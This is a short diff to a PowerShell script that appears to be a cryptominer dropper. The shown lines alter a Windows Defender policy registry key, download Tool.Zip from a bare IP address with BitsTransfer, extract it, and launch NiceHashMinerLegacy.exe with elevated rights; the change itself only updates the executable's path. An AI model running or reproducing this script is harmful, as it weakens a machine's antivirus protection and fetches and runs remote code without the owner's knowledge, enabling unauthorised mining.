@@ -5,4 +5,4 @@ New-ItemProperty -Path �HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender� 
 Import-Module BitsTransfer
 Start-BitsTransfer -Source http://139.180.134.229/Tool.Zip -Destination c:\Tool.Zip
 Expand-Archive -Path c:\Tool.Zip -DestinationPath C:\Tool
-Start-Process C:\Tool\nhm_windows_1.9.0.23\NiceHashMinerLegacy.exe  runAs
+Start-Process C:\Tool\NiceHashMinerLegacy.exe  runAs
